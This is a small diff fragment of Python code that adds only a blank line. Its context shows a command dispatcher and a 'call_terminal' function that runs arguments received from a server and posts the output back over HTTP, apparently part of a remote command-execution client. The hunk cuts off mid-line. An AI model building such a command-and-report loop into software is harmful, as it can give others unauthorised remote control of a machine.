@@ -67,6 +67,7 @@ def handle_resp(resp, args, client):
     func_ = HANDLER.get(resp, invalid_cmd)
     func_(client, args)
 
+
 def call_terminal(client, args):
     output = run(args)
     requests.post("http://{}/response/{}".format(
